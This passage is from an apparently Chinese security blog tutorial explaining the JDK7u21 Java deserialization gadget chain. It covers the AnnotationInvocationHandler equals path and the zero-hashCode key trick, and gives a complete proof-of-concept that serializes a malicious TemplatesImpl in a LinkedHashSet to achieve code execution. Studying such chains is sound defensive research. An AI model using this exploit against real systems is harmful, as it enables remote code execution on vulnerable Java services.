class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">private Boolean equalsImpl(Object var1) &#123;  </span><br><span class="line">    if (var1 == this) &#123;  </span><br><span class="line">        return true;  </span><br><span class="line">    &#125; else if (!this.type.isInstance(var1)) &#123;  </span><br><span class="line">        return false;  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        Method[] var2 = this.getMemberMethods();  </span><br><span class="line">        int var3 = var2.length;  </span><br><span class="line">  </span><br><span class="line">        for(int var4 = 0; var4 &lt; var3; ++var4) &#123;  </span><br><span class="line">            Method var5 = var2[var4];  </span><br><span class="line">            String var6 = var5.getName();  </span><br><span class="line">            Object var7 = this.memberValues.get(var6);  </span><br><span class="line">            Object var8 = null;  </span><br><span class="line">            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);  </span><br><span class="line">            if (var9 != null) &#123;  </span><br><span class="line">                var8 = var9.memberValues.get(var6);  </span><br><span class="line">            &#125; else &#123;  </span><br><span class="line">                try &#123;  </span><br><span class="line">                    var8 = var5.invoke(var1);  </span><br><span class="line">                &#125; catch (InvocationTargetException var11) &#123;  </span><br><span class="line">                    return false;  </span><br><span class="line">                &#125; catch (IllegalAccessException var12) &#123;  </span><br><span class="line">                    throw new AssertionError(var12);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            if (!memberValueEquals(var7, var8)) &#123;  </span><br><span class="line">                return false;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        return true;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> /**/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private Method[] getMemberMethods() &#123;  </span><br><span class="line">    if (this.memberMethods == null) &#123;  </span><br><span class="line">        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;  </span><br><span class="line">            public Method[] run() &#123;  </span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();  </span><br><span class="line">                AccessibleObject.setAccessible(var1, true);  </span><br><span class="line">                return var1;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    return this.memberMethods;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先来看equalsImpl()  方法<br><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/1.jpg"></p><p>跟进这个  getMemberMethods() 方法，可以知道 这是遍历 this.type 这个对象的所有方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private Method[] getMemberMethods() &#123;  </span><br><span class="line">    if (this.memberMethods == null) &#123;  </span><br><span class="line">        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;  </span><br><span class="line">            public Method[] run() &#123;  </span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();  </span><br><span class="line">                AccessibleObject.setAccessible(var1, true);  </span><br><span class="line">                return var1;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    return this.memberMethods;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，equalsImpl()  这个方法是将 this.type 类中的所有方法都遍历执行了，那么，假设 this.type 是Templates 类，那么一定会调用到 其中的  newTransformer() 或者 getOutputProperties() 方法，进而触发任意代码执行  ， 这就是JDK7u21 的核心原理~</p><h1 id="寻找-equalsImpl-调用链"><a href="#寻找-equalsImpl-调用链" class="headerlink" title="寻找 equalsImpl 调用链"></a>寻找 equalsImpl 调用链</h1><p>我们现在的目标就是为了调用这个 equalsimpl ，而 equalsimpl 是一个  private 私有方法，在 AnnotationInvocationHandler#invoke 中被调用。<br><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/2.jpg"></p><p>AnnotationInvocationHandler 是 一个InvocationHandler 接口的实现， InvocationHandler是一个接口，他只有一个方法就是invoke：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    public Object invoke(Object proxy, Method method, Object[] args)  </span><br><span class="line">        throws Throwable;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在使用 java.reflect.Proxy 动态绑定一个接口时，如果调用该接口中任意一个方法，会执行到 InvocationHandler#invoke 。执行invoke时，被传入的第一个参数是这个proxy对象，第二个参数是 被执行的方法名，第三个参数是执行时的参数列表。</p><p>我们来看看 AnnotationInvocationHandler#invoke</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Object var1, Method var2, Object[] var3) &#123;  </span><br><span class="line">    String var4 = var2.getName();  </span><br><span class="line">    Class[] var5 = var2.getParameterTypes();  </span><br><span class="line">    if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;  </span><br><span class="line">        return this.equalsImpl(var3[0]);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        assert var5.length == 0;  </span><br><span class="line">  </span><br><span class="line">        if (var4.equals(&quot;toString&quot;)) &#123;  </span><br><span class="line">            return this.toStringImpl();  </span><br><span class="line">        &#125; else if (var4.equals(&quot;hashCode&quot;)) &#123;  </span><br><span class="line">            return this.hashCodeImpl();  </span><br><span class="line">        &#125; else if (var4.equals(&quot;annotationType&quot;)) &#123;  </span><br><span class="line">            return this.type;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.................</span><br></pre></td></tr></table></figure><p>如果 传入的方法名 为  “equals”  且方法仅有一个类型参数时，就会调用 equalsImpl()</p><p>所以我们要找到一个方法， 反序列化时 对proxy 调用 equals 方法</p><h1 id="找到equals-调用链"><a href="#找到equals-调用链" class="headerlink" title="找到equals 调用链"></a>找到equals 调用链</h1><p>在上篇我们遇到，和equals 类似的 用法有另一个方法， <code>CompareTo</code>  他通常被实现用于比较两个对象的值是是否相等，但他用的 compareTo 方法，并不是我们需要的 equals，另一个常见的会调用 equals 的场景就是 集合Set ，Set 中储存的 对象不允许重复，所以在添加对象时，一定会触碰到对比的操作 。</p><p>我们来看一下 HashSet 的ReadObject 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    private void readObject(java.io.ObjectInputStream s)  </span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">        // Read in any hidden serialization magic  </span><br><span class="line">        s.defaultReadObject();  </span><br><span class="line">  </span><br><span class="line">        // Read in HashMap capacity and load factor and create backing HashMap  </span><br><span class="line">        int capacity = s.readInt();  </span><br><span class="line">        float loadFactor = s.readFloat();  </span><br><span class="line">        map = (((HashSet)this) instanceof LinkedHashSet ?  </span><br><span class="line">               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :  </span><br><span class="line">               new HashMap&lt;E,Object&gt;(capacity, loadFactor));  </span><br><span class="line">  </span><br><span class="line">        // Read in size  </span><br><span class="line">        int size = s.readInt();  </span><br><span class="line">  </span><br><span class="line">        // Read in all elements in the proper order.  </span><br><span class="line">        for (int i=0; i&lt;size; i++) &#123;  </span><br><span class="line">            E e = (E) s.readObject();  </span><br><span class="line">            map.put(e, PRESENT);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>map</code>也是瞬态属性。这里得到的很明显是<code>HashMap</code>，然后依次从<code>s.readObject()</code>里面读取key，然后调用<code>map.put</code>方法放进去，因为也说了，<code>HashSet</code>的底层实现还是<code>HashMap</code>， 还要说一点， 哈希表其实是由 数组 + 链表实现的， 哈希表 底层 保存在一个数组中，数组的索引是由哈希表的键的hash值计算得到的 ，也就是 key.hashcode() , 数组的值是一个链表，所有hash碰撞到相同索引的key-value，都会被链接到 链表后面 ，这里借用 p牛的一张图 </p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/3.jpg"></p><p>我们跟进一下这里的 put 方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;  </span><br><span class="line">    if (key == null)  </span><br><span class="line">        return putForNullKey(value);  </span><br><span class="line">    int hash = hash(key);  </span><br><span class="line">    int i = indexFor(hash, table.length);  </span><br><span class="line">    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;  </span><br><span class="line">        Object k;  </span><br><span class="line">        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;  </span><br><span class="line">            V oldValue = e.value;  </span><br><span class="line">            e.value = value;  </span><br><span class="line">            e.recordAccess(this);  </span><br><span class="line">            return oldValue;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现 对放入的 key进行了 hash，看见这里的  if 方法内，如果当前的map 中 有hash值相同的key，就会 key.equals(k) 如果 key 是代理对象，k 为TemplatesImpl ，则此时会调用  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.invoke-&gt;AnnotationInvocationHandler.equalsImpl-&gt;TemplatesImpl.newTransformer</span><br></pre></td></tr></table></figure><p>从而执行命令， 所以我觉得，能找到这条链子的师傅实在是实力强👍</p><p>计算  “哈希” 的主要是下面这两行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int hash = hash(key);  </span><br><span class="line">int i = indexFor(hash, table.length);</span><br></pre></td></tr></table></figure><p>跟进 hash()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">final int hash(Object k) &#123;  </span><br><span class="line">    int h = 0;</span><br><span class="line">h ^= k.hashCode();  </span><br><span class="line">  </span><br><span class="line">h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);  </span><br><span class="line">    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除了 调用hashCode 外，没有其他的东西，所以 proxy 对象 与TemplateImpl   是否相等，取决于这两个对象的 hashcode() 是否相等。那我们就来看看这两个方法，首先是 TemplatesImpl 的hashcode 方法，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Test7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        TemplatesImpl templates2 = new TemplatesImpl();  </span><br><span class="line">        System.out.println(&quot;temp2:&quot;+templates.hashCode());  </span><br><span class="line">        System.out.println(&quot;temp2:&quot;+ templates2.hashCode());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/4.jpg"></p><p>发现他每次 的hashCode 后的值都不唯一，Debug 也无法跟踪调试，而是直接打印了其hash值，网上说是 Native 方法 ，那么什么是Native方法？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">native 是用做java 和其他语言（如c++）进行协作时使用的，也就是native 后的函数的实现不是用java写的。  </span><br><span class="line">既然都不是java，那就别管它的源代码了，我们只需要知道这个方法已经被实现即可。  </span><br><span class="line">native的意思就是通知操作系统， 这个函数你必须给我实现，因为我要使用。 所以native关键字的函数都是操作系统实现的， java只能调用。  </span><br><span class="line">java是跨平台的语言，既然是跨了平台，所付出的代价就是牺牲一些对底层的控制，而java要实现对底层的控制，就需要一些其他语言的帮助，这个就是native的作用了。</span><br></pre></td></tr></table></figure><p>虽然如此，我们不难发现， 每次运行 其hash 都在改变，所以想让 proxy 的hashCode 与其相等，只能寄希望于 proxy.hashCode() ….</p><p>再想想代理对象的hashCode 方法，既然是代理对象，调用其 hashCode() 很明显会调用到 AnnotationInvocationHandler#invoke 进而调用到 AnnotationInvocationHandler#hashCodeImpl：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125; else if (var4.equals(&quot;hashCode&quot;)) &#123;  </span><br><span class="line">    return this.hashCodeImpl();</span><br></pre></td></tr></table></figure><p>进入此方法 看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private int hashCodeImpl() &#123; </span><br><span class="line">int result = 0; </span><br><span class="line">for (Map.Entry e : memberValues.entrySet()) &#123; </span><br><span class="line">result += (127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">return result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说，就是遍历这个 memberValues这个Map ，把每次计算出来的  127*(key的hash)^(value的hash)  </p><p>开发出这链子的作者很牛逼，他想到让这个 memberValues这个Map 只有一个键值对，让key 的hash为 0  ，这样 127*0 &#x3D; 0  ，然后0 ^ xxx 仍然是xxx (相同为0  ，不同为1)，再让value 是恶意的 TemplatesImpl对象，这样计算的就是那个 <code>TemplatesImpl</code>对象的hash值 自然就 两个hash 相等了。</p><p>不得不说 nbbbbbbb</p><p>所以我们找到一个 hashCode 是 0 的对象作为 memberValues 的key，将恶意TemplateImpl对象作为 value，这个proxy计算的hashCode就与TemplateImpl对象本身的hashCode相等了。</p><p>找一个hashCode 是 0 的对象，我们可以写一个脚本爆破一下 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        for (long i = 0; i &lt; 9999999999L; i++) &#123;  </span><br><span class="line">            if (Long.toHexString(i).hashCode() == 0)&#123;  </span><br><span class="line">                System.out.println(Long.toHexString(i));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本跑出来的是 f5a5a608 </p><h1 id="利用链整理"><a href="#利用链整理" class="headerlink" title="利用链整理"></a>利用链整理</h1><p>说了这么多，想必脑子也昏昏的了，这里就整理一下过程</p><ul><li>首先 第一步肯定是 生成 TemplateImpl 恶意对象</li><li>实例化 AnnotationInvocationHandler对象 <ul><li>他的type属性是一个 TemplateImpl 类(因为getMemberMethods会遍历其方法)</li><li>他的memberValues属性是一个Map，Map只有一个Key和Value，Key是f5a5a608，value是TemplateImpl类</li></ul></li><li>对 AnnotationInvocationHandler对象做一层代理，生成proxy 对象(因为要进入invoke 调用hashcode)</li><li>实例化一个HashSet 这个 HashSet 有两个元素 分别是<ul><li>TemplateImpl对象</li><li>proxy对象</li></ul></li><li>将HashSet 对象序列化</li></ul><p>反序列化触发代码如下：</p><ul><li>触发HashSet的readobject方法，其中 使用HashMap的Key去重</li><li>去重时计算HashSet中的两个元素的 hashCode() ，因为我们的静心构造二者相等，进而触发 equals() 方法</li><li>调用 AnnotationInvocationHandler#equalsImpl 方法</li><li>equalsImpl 中遍历 this.type 的每个方法并调用</li><li>因为 this.type 是TemplatesImpl类，所以触发了 newTransform() 或 getOutputProperties() 方法</li><li>代码执行</li></ul><p>按我的理解简单来说，就是利用hashCodeImpl() 使 两者的key的hash相同，就会进行比较，调用 equals方法，从而进行漏洞利用。<br>让我震惊的就是equals的调用和这个hash值的构造，属实tql</p><p>POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import org.apache.commons.codec.binary.Base64;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.LinkedHashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class JDK7u21 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        String zeroHashCodeStr = &quot;f5a5a608&quot;;</span><br><span class="line"></span><br><span class="line">        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, &quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">        // 实例化AnnotationInvocationHandler类</span><br><span class="line">        Constructor handlerConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(true);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        // 为tempHandler创造一层代理</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"></span><br><span class="line">        // 实例化HashSet，并将两个对象放进去</span><br><span class="line">        HashSet set = new LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        // 将恶意templates设置到map中</span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(set);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我会给大家剖析 POC 怎么构造的，深刻理解POC原理</p><p>雷打不动的 TemplatesImpl对象设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">SerializeUtil.setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;evilCode&#125;);</span><br><span class="line">SerializeUtil.setFieldValue(templates,&quot;_name&quot;,&quot;Ku1s&quot;);</span><br></pre></td></tr></table></figure><p>然后是 new 一个 AnnotationInvocationHandler对象，看看他的构造器：</p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/5.jpg"></p><p>前面也说过，type 是 TemplatesImpl对象，将循环调用他全部方法，而memberMethods 是一个键值对，其Key 是 0 ，value 则是 TemplatesImpl.hash 。</p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/6.jpg"></p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/7.png"></p><p>所以我们 先创建一个 memberMethods ，我们也说过，他本质上是个HashMap ，添加其值，我们先不把TemplatesImpl 放进 memberValues的value，待会会说为什么，然后再实例化 AnnotationInvocationHandler，进行初始化构造(因为此类无法new 所以要 class.forname) ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; memberValue = new HashMap&lt;String, Object&gt;();  </span><br><span class="line">memberValue.put(&quot;f5a5a608&quot;,&quot;Ku1s&quot;);  </span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //得到构造器  </span><br><span class="line">constructor.setAccessible(true);  </span><br><span class="line">InvocationHandler  handler = (InvocationHandler) constructor.newInstance(Templates.class, memberValue); //实例化</span><br></pre></td></tr></table></figure><p>然后就是生成动态代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>然后就是生成反序列化链的起点，那个<code>HashSet</code>对象了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashSet = new LinkedHashSet();</span><br><span class="line">hashSet.add(templates);</span><br><span class="line">hashSet.add(proxy);</span><br><span class="line">memberValues.put(&quot;f5a5a608&quot;,templates);</span><br></pre></td></tr></table></figure><p>这里再覆盖掉<code>f5a5a608</code>的value，就是为了防止这里的2次<code>add</code>直接触发了漏洞。 </p><p>完整POC：<br>JDK7u21.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public class JDK7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;  </span><br><span class="line">            ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()  </span><br><span class="line">        &#125;);  </span><br><span class="line">        setFieldValue(templates, 